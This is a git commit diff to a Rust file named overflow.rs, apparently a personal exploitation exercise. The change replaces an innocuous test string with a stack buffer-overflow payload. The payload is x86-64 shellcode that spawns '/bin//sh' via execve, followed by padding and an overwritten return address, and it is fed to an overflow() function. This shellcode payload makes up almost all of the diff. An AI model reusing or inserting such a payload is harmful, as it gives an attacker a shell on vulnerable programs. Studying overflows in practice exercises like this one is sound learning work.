d44c90e033be629af662122a9befd043adc4aec9
cal <callum.adair@outlook.com>
2023-05-03 09:42:28 +0100

    bigger bs

--- overflow.rs
+++ overflow.rs
@@ -5,6 +5,6 @@ fn overflow(input_str: String) {
 }
 
 fn main() {
-    let rand_str: String = String::from("aaaabbbb\x6c\x73\x20\x2d\x6c\x61ddeeee");
+    let rand_str: String = String::from("aaaaaaaa\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbcccccccc\x30\xe3\xff\xff\xff\x7f");
     overflow(rand_str);
 }
